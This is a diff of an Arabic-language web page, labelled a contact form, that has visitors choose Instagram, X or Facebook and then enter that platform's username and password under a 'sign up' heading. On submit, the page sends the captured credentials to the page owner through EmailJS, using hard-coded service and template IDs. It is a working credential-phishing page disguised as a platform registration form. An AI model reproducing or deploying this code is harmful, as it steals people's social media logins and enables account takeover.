@@ -6,62 +6,46 @@
     <title>نموذج الاتصال</title>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        // تهيئة EmailJS
         (function () {
-            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل بـ Public Key الخاص بك
+            emailjs.init("1xqwBMfecM1SSulsh"); // المفتاح العام
         })();
 
-        function toggleLanguage(lang) {
-            const elements = document.querySelectorAll("[data-ar], [data-en]");
-            elements.forEach(el => {
-                el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
-            });
-            document.documentElement.lang = lang;
-        }
-
-        // تفعيل النموذج عند الضغط على منصات
+        // تفعيل النموذج عند اختيار منصة
         function activateContactForm(platformName) {
-            const formContainer = document.getElementById('form-container');
-            const platformInput = document.getElementById('platform');
-            const platformDisplay = document.getElementById('platform-name');
+            const formContainer = document.getElementById("form-container");
+            const platformInput = document.getElementById("platform");
+            const platformTitle = document.getElementById("platform-name");
             
-            platformInput.value = platformName; // تعيين المنصة في الحقل المخفي
-            platformDisplay.textContent = platformName; // تغيير النص إلى اسم المنصة
-            formContainer.style.display = 'block'; // إظهار النموذج
+            // تعيين اسم المنصة
+            platformInput.value = platformName;
+            platformTitle.textContent = `التسجيل في ${platformName}`;
+            formContainer.style.display = "block"; // عرض النموذج
         }
 
-        function sendEmail(event) {
-            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+        // إرسال البيانات عبر EmailJS
+        function sendPlatformData(event) {
+            event.preventDefault(); // منع التحديث التلقائي للصفحة
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const platform = document.getElementById("platform").value;
 
-            const form = document.getElementById('contact-form');
-            const username = form.username.value;
-            const password = form.password.value;
-            const platform = form.platform.value;
-
-            // تحقق من الحقول المدخلة
-            if (!username || !password || !platform) {
-                alert('يرجى ملء جميع الحقول.');
-                return;
-            }
-
-            // تسجيل البيانات المرسلة في الكونسول
-            console.log('Sending data to EmailJS:', { platform, username, password });
-
-            // إعداد البيانات التي سيتم إرسالها إلى القالب في EmailJS
-            var templateParams = {
-                platform: platform,     // اسم المنصة
-                username: username,     // اسم المستخدم
-                password: password      // كلمة المرور
+            const templateParams = {
+                username: username,
+                password: password,
+                platform: platform
             };
 
-            // إرسال البيانات عبر EmailJS
-            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams).then(function(response) {
-                console.log('Success:', response);
-                alert('تم إرسال الرسالة بنجاح!');
-                form.reset(); // إعادة تعيين النموذج بعد الإرسال
-            }, function(error) {
-                console.log('Error:', error);  // تسجيل الخطأ إذا حدث
-                alert('حدث خطأ أثناء إرسال الرسالة. تحقق من الكونسول لمزيد من التفاصيل.');
-            });
+            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
+                .then(function (response) {
+                    alert('تم إرسال البيانات بنجاح!');
+                    console.log('Success:', response);
+                    document.getElementById("registration-form").reset(); // إعادة تعيين النموذج
+                }, function (error) {
+                    alert('حدث خطأ أثناء الإرسال. الرجاء المحاولة مرة أخرى.');
+                    console.error('Error:', error);
+                });
         }
     </script>
     <style>
@@ -80,29 +64,6 @@
             padding: 15px 30px;
             background-color: #222;
             color: white;
-        }
-        header .language-switcher {
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .hero {
-            background: url('48b04dce-b281-40a5-9fc2-510e026c751f_rw_1920.gif') no-repeat center center/cover;
-            height: 400px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
-            font-size: 28px;
-        }
-        .content {
-            text-align: center;
-            padding: 30px;
-        }
-        .welcome-message {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
         }
         .platform {
             margin: 15px;
@@ -124,7 +85,7 @@
             margin-top: 30px;
             text-align: left;
         }
-        .form-container input, .form-container textarea {
+        .form-container input, .form-container button {
             width: 90%;
             max-width: 400px;
             padding: 12px;
@@ -135,68 +96,37 @@
             font-size: 16px;
         }
         .form-container button {
-            padding: 12px 25px;
             background-color: #444;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 18px;
             cursor: pointer;
-            display: block;
-            margin: 20px auto;
             transition: background-color 0.3s;
         }
         .form-container button:hover {
             background-color: #666;
         }
-        .contact-toggle {
-            padding: 15px 30px;
-            background-color: #444;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 20px auto;
-            display: block;
-            transition: background-color 0.3s;
-        }
-        .contact-toggle:hover {
-            background-color: #666;
-        }
     </style>
 </head>
 <body>
-
 <header>
-    <div data-ar="نموذج الاتصال" data-en="Contact Form">نموذج الاتصال</div>
-    <div class="language-switcher">
-        <span onclick="toggleLanguage('ar')">العربية</span> | <span onclick="toggleLanguage('en')">English</span>
-    </div>
+    <div>نموذج الاتصال</div>
 </header>
 
-<div class="hero">
-    <div data-ar="مرحبًا بك في مهمتنا!" data-en="Welcome to our mission!">مرحبًا بك في مهمتنا!</div>
-</div>
-
 <div class="content">
-    <div class="welcome-message" data-ar="اختر المنصة التي تود الانضمام إليها." data-en="Choose the platform you want to join.">اختر المنصة التي تود الانضمام إليها.</div>
-
-    <div class="platform" id="instagram" onclick="activateContactForm('إنستغرام')" data-ar="إنستغرام" data-en="Instagram">إنستغرام</div>
-    <div class="platform" id="x" onclick="activateContactForm('إكس')" data-ar="إكس" data-en="X">إكس</div>
-    <div class="platform" id="facebook" onclick="activateContactForm('فيسبوك')" data-ar="فيسبوك" data-en="Facebook">فيسبوك</div>
+    <h2>اختر المنصة</h2>
+    <div class="platform" onclick="activateContactForm('إنستغرام')">إنستغرام</div>
+    <div class="platform" onclick="activateContactForm('إكس')">إكس</div>
+    <div class="platform" onclick="activateContactForm('فيسبوك')">فيسبوك</div>
 
     <div class="form-container" id="form-container">
-        <h3 id="platform-name" data-ar="التسجيل في" data-en="Sign up for">التسجيل في</h3>
-        <form id="contact-form" onsubmit="sendEmail(event)">
+        <h3 id="platform-name">التسجيل في</h3>
+        <form id="registration-form" onsubmit="sendPlatformData(event)">
             <input type="hidden" name="platform" id="platform">
-            <input type="text" name="username" placeholder="اسم المستخدم" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit" data-ar="انضمام" data-en="Join">انضمام</button>
+            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">إرسال</button>
         </form>
     </div>
-
 </div>
-
 </body>
 </html>
